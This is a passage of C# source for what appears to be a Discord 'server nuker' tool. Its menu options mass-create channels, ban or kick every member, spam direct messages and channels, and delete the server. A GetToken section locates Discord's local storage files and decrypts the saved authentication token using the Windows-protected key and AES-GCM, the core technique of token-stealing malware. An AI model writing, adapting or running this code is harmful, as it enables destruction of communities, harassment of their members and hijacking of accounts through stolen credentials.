                        WriteLogo();
                        Console.Write("Count (max 500): ");
                        int count = int.Parse(Console.ReadLine());
                        Console.Clear();
                        WriteLogo();

                        for (int i = 0; i < count; i++)
                        {
                            try
                            {
                                guild.CreateChannel(name, 0);
                                Thread.Sleep(WaitTimeShort);
                            }
                            catch { }
                        }
                    }
                    catch
                    { }
                    DoneMethod2();
                    break;
                case 8:
                    try
                    {
                        foreach (var user in client.GetCachedGuild(Convert.ToUInt64(guildid)).GetMembers())
                        {
                            user.Ban();
                            Thread.Sleep(WaitTimeShort);
                        }
                    }
                    catch
                    { }
                    DoneMethod2();
                    break;
                case 9:
                    try
                    {
                        foreach (var user in client.GetCachedGuild(Convert.ToUInt64(guildid)).GetMembers())
                        {
                            user.Kick();
                            Thread.Sleep(WaitTimeShort);
                        }
                    }
                    catch
                    { }
                    DoneMethod2();
                    break;
                case 10:
                    Console.Clear();
                    WriteLogo();
                    Console.Write("Message: ");
                    string message = Console.ReadLine();
                    Console.Clear();
                    WriteLogo();

                    var members = client.GetCachedGuild(Convert.ToUInt64(guildid)).GetMembers();

                    foreach (var user in members)
                    {
                        PrivateChannel channel = client.CreateDM(user.User.Id);
                        client.SendMessage(channel, message);
                        Thread.Sleep(WaitTimeShort);
                    }
                    DoneMethod2();
                    break;
                case 11:
                    try
                    {
                        Console.Clear();
                        WriteLogo();
                        Console.WriteLine("\nServer Info:");
                        Console.WriteLine("ID: " + guild.Id + "\nOwner ID: " + guild.OwnerId + "\nBans count: " + guild.GetBans().Count + "\nChannels count: " + guild.GetChannels().Count + "\nEmojis count: " + guild.GetEmojis().Count + "\nInvites count: " + guild.GetInvites().Count + "\nRoles count: " + guild.GetRoles().Count + "\nTemplates count: " + guild.GetTemplates().Count + "\nWebhooks count: " + guild.GetWebhooks().Count + "\n2FA required: " + guild.MfaRequired + "\nNitro boosts: " + guild.NitroBoosts + "\nPremium tier: " + guild.PremiumTier + "\nRegion: " + guild.Region + "\nVanity invite: " + guild.VanityInvite + "\nVerification level: " + guild.VerificationLevel);
                        Console.WriteLine("\nPress any key to go back.");
                        Console.ReadKey();
                        Thread.Sleep(WaitTimeLong);
                        Console.Clear();
                        ServerNuker();
                    }
                    catch
                    { }
                    break;
                case 12:
                    try
                    {
                        guild.Delete();
                        Thread.Sleep(WaitTimeShort);
                        guild.Leave();
                        Thread.Sleep(WaitTimeShort);
                    }
                    catch 
                    { }
                    DoneMethod2();
                    break;
                case 13:
                    Console.Clear();
                    WriteLogo();
                    Console.WriteLine("[1] Spam");
                    Console.WriteLine("[2] One Message");
                    Console.WriteLine();
                    Console.Write("Your choice: ");
                    string choice = Console.ReadLine();
                    if (choice == "1")
                    {
                        Console.Clear();
                        WriteLogo();
                        Console.Write("Message: ");
                        string msg = Console.ReadLine();
                        Console.Clear();
                        WriteLogo();
                        Console.Write("Messages count: ");
                        string count = Console.ReadLine();
                        Console.Clear();
                        WriteLogo();
                        int total = 0;
                        for (int i = 0; i < int.Parse(count); i++)
                        {
                            try
                            {
                                total++;
                                foreach (var roles in guild.GetChannels())
                                {
                                    try
                                    {
                                        ulong id = roles.Id;
                                        client.SendMessage(id, msg);
                                        Thread.Sleep(WaitTimeShort);
                                    }
                                    catch { }
                                }

                            }
                            catch { }
                        }
                    }
                    else
                    {
                        Console.Clear();
                        WriteLogo();
                        Console.Write("Message: ");
                        string msg = Console.ReadLine();
                        Console.Clear();
                        WriteLogo();

                        foreach (var roles in guild.GetChannels())
                        {
                            try
                            {
                                ulong id = roles.Id;
                                client.SendMessage(id, msg);
                                Thread.Sleep(WaitTimeShort);
                            }
                            catch { }
                        }
                    }
                    DoneMethod2();
                    break;
                case 14:
                    Start();
                    break;
                case 15:
                    Environment.Exit(0);
                    break;
            }
        }
        #endregion

        #region Get Token
        static string GetToken()
        {
            string token = "";

            Regex EncryptedRegex = new Regex("(dQw4w9WgXcQ:)([^.*\\['(.*)'\\].*$][^\"]*)", RegexOptions.Compiled);

            string[] dbfiles = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\discord\Local Storage\leveldb\", "*.ldb", SearchOption.AllDirectories);
            foreach (string file in dbfiles)
            {
                FileInfo info = new FileInfo(file);
                string contents = File.ReadAllText(info.FullName);

                Match match = EncryptedRegex.Match(contents);
                if (match.Success)
                {
                    token = DecryptToken(Convert.FromBase64String(match.Value.Split(new[] { "dQw4w9WgXcQ:" }, StringSplitOptions.None)[1]));
                }
            }

            return token;
        }

        static byte[] DecryptKey(string path)
        {
            dynamic DeserializedFile = JsonConvert.DeserializeObject(File.ReadAllText(path));
            return ProtectedData.Unprotect(Convert.FromBase64String((string)DeserializedFile.os_crypt.encrypted_key).Skip(5).ToArray(), null, DataProtectionScope.CurrentUser);
        }

        static string DecryptToken(byte[] buffer)
        {
            byte[] EncryptedData = buffer.Skip(15).ToArray();
            AeadParameters Params = new AeadParameters(new KeyParameter(DecryptKey(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\discord\Local State")), 128, buffer.Skip(3).Take(12).ToArray(), null);
            GcmBlockCipher BlockCipher = new GcmBlockCipher(new AesEngine());
            BlockCipher.Init(false, Params);
            byte[] DecryptedBytes = new byte[BlockCipher.GetOutputSize(EncryptedData.Length)];
            BlockCipher.DoFinal(DecryptedBytes, BlockCipher.ProcessBytes(EncryptedData, 0, EncryptedData.Length, DecryptedBytes, 0));
            return Encoding.UTF8.GetString(DecryptedBytes).TrimEnd("\r\n\0".ToCharArray());
        }
        #endregion
    }
}
